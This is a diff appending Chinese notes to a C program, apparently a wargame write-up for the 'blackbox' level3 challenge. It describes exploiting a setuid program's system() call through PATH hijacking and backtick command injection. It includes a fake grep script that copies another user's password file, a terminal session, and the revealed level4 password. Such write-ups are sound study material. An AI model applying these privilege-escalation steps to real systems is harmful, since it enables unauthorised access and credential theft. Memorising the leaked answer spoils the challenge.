@@ -41,3 +41,20 @@ int main(int main, char **argv)
 
         return 0;
 }
+
+
+system(command.c_str()) 有个很明显的提权漏洞，有两种方法提权：1. grep没有使用绝对路径，因此可以修改PATH
+用我们自己的grep替换系统的grep。2.程序虽然会对我们的输入进行过滤，防止执行我们输入的程序，但是程序没有对
+"`"进行过滤，因此可以输入一个shell文件： 输入：`getlevel4pass`(注意不要掉了"`")
+
+grep
+#!/bin/sh      (注意这里不能使用#!/bin/bash，否则会丢失权限)
+/bin/cat /home/level4/password > /tmp/level3/level4_pass
+
+参考可见: http://stackoverflow.com/questions/13209215/bin-sh-does-not-drop-privileges
+
+level3@blackbox:/tmp/level3$ /home/level3/proclist 
+Enter the name of the program: a
+level3@blackbox:/tmp/level3$ cat level4_pass 
+BashingSh
+level3@blackbox:/tmp/level3$ 
